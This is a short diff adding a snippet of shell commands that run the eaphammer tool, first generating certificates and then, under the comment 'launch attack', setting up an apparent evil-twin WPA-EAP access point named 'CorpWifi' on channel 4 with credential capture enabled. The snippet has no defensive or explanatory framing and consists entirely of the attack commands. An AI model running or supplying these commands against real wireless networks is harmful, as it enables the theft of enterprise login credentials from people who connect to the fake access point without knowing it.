@@ -1,0 +1,5 @@
+# generate certificates
+./eaphammer --cert-wizard
+
+# launch attack
+./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
